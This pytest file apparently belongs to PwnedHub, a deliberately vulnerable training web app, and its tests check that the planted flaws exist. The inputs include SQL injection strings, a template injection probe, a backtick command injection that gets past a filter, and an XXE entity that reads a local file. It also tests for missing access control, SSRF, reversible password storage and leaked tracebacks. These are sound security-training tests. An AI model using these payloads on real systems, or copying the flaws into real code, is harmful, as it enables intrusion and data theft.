import time
from unittest.mock import patch, MagicMock

from pwnedhub.extensions import db as _db
from pwnedhub.models import Config, User, Tool


class TestSQLInjection:
    """Tests that verify SQL injection vulnerabilities exist."""

    def test_sqli_login(self, client, db_session):
        """When SQLI_PROTECT=False, login with SQL injection payload succeeds."""
        config = Config.get_by_name('SQLI_PROTECT')
        config.value = False
        db_session.commit()

        response = client.post('/login', data={
            'username': "' OR 1=1--",
            'password': 'anything',
        })
        # Successful login redirects to /home
        assert response.status_code == 302
        location = response.headers.get('Location', '')
        # Should redirect to home, not back to login with error
        assert 'error' not in location

    def test_sqli_tools_info(self, logged_in_client, db_session):
        """GET /tools/info/1 OR 1=1 returns data via SQL injection in tid param."""
        config = Config.get_by_name('SQLI_PROTECT')
        config.value = False
        db_session.commit()

        response = logged_in_client.get('/tools/info/1 OR 1=1')
        assert response.status_code == 200
        data = response.get_json()
        # SQL injection should return at least one tool
        assert data is not None
        assert 'id' in data

    def test_sqli_reset(self, client, db_session):
        """POST /reset with SQL injection username sets reset_id in session."""
        response = client.post('/reset', data={
            'username': "' OR 1=1--",
        })
        # If injection works, it finds a user and redirects to the question step
        assert response.status_code == 302
        location = response.headers.get('Location', '')
        assert 'question' in location or 'reset' in location


class TestSSTI:
    """Tests that verify Server-Side Template Injection vulnerability."""

    def test_ssti_404(self, client):
        """Request a URL containing {{7*7}} triggers template injection in 404 handler."""
        response = client.get('/%7B%7B7*7%7D%7D')
        assert response.status_code == 404
        # The 404 handler uses render_template_string with raw URL
        assert b'49' in response.data


class TestMissingAccessControl:
    """Tests that verify missing access control checks."""

    def test_missing_admin_check_on_user_modify(self, logged_in_client, admin_user, db_session):
        """Regular user can access /admin/users/promote/<uid> (missing @roles_required)."""
        admin_id = admin_user.id
        target_user = User.query.filter(User.id != admin_id).first()
        if target_user:
            response = logged_in_client.get(f'/admin/users/promote/{admin_id}')
            # Should NOT be 403 because the roles_required decorator is missing
            assert response.status_code != 403
            assert response.status_code == 302

    def test_unfurl_no_auth(self, client):
        """POST /messages/unfurl works without authentication (SSRF vector)."""
        with patch('pwnedhub.utils.requests.get') as mock_get:
            mock_resp = MagicMock()
            mock_resp.content = b'<html><head><meta property="og:title" content="Test"></head></html>'
            mock_get.return_value = mock_resp

            response = client.post('/messages/unfurl',
                json={'url': 'http://example.com'},
                content_type='application/json',
            )
            # Should work without login (no login_required decorator)
            assert response.status_code == 200

    def test_diagnostics_unauthenticated(self, client):
        """GET /diagnostics is accessible without login (information disclosure)."""
        response = client.get('/diagnostics')
        assert response.status_code == 200
        assert b'python_version' in response.data


class TestCommandInjection:
    """Tests that verify command injection bypass is possible."""

    def test_command_injection_basic_bypass(self, logged_in_client, db_session):
        """When OSCI_PROTECT=False, backticks are NOT blocked by the validator."""
        config = Config.get_by_name('OSCI_PROTECT')
        config.value = False
        db_session.commit()

        tool = Tool.query.first()
        assert tool is not None

        with patch('pwnedhub.routes.core.subprocess.Popen') as mock_popen:
            mock_proc = MagicMock()
            mock_proc.communicate.return_value = (b'uid=1000(test)', b'')
            mock_popen.return_value = mock_proc

            # Backticks bypass the basic [;&|] regex filter
            response = logged_in_client.post(f'/tools/execute/{tool.id}',
                json={'args': '`id`'},
                content_type='application/json',
            )
            assert response.status_code == 200
            data = response.get_json()
            # The command should NOT be blocked (no 'invalid characters' error)
            assert data.get('error') is False


class TestXXE:
    """Tests that verify XXE vulnerability exists."""

    def test_xxe_artifacts_create(self, logged_in_client, db_session):
        """POST /artifacts/create with XXE payload is accepted by the parser."""
        xml_payload = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
    <content>&xxe;</content>
    <filename>test</filename>
</root>'''

        response = logged_in_client.post('/artifacts/create',
            data=xml_payload,
            content_type='application/xml',
        )
        # The parser uses etree.XMLParser(no_network=False), so it accepts entity definitions
        assert response.status_code == 200
        assert 'application/xml' in response.content_type


class TestPasswordStorage:
    """Tests that verify insecure password storage."""

    def test_password_stored_reversibly(self, logged_in_client, user):
        """User.password_as_string returns plaintext password (XOR is reversible)."""
        plaintext = user.password_as_string
        assert plaintext == 'testpassword'
        assert isinstance(plaintext, str)
        assert len(plaintext) > 0


class TestTimingSideChannel:
    """Tests that verify timing side channel in login."""

    def test_timing_side_channel(self, client):
        """Valid username takes significantly longer due to time.sleep(0.1)."""
        # Time a request with a valid username
        start = time.time()
        client.post('/login', data={
            'username': 'testuser',
            'password': 'wrongpassword',
        })
        valid_time = time.time() - start

        # Time a request with an invalid username
        start = time.time()
        client.post('/login', data={
            'username': 'nonexistentuser',
            'password': 'wrongpassword',
        })
        invalid_time = time.time() - start

        # Valid username should take at least 100ms longer
        assert valid_time > invalid_time + 0.05


class TestErrorHandling:
    """Tests that verify error handler information leakage."""

    def test_error_500_leaks_traceback(self, logged_in_client):
        """Trigger a 500 error with JSON content type, verify traceback in response."""
        response = logged_in_client.get('/tools/info/INVALID_SQL\'',
            content_type='application/json',
        )
        # The error handler returns traceback in the JSON response
        if response.status_code == 500:
            data = response.get_json()
            assert 'message' in data
            assert 'Traceback' in data.get('message', '') or 'Error' in data.get('message', '')
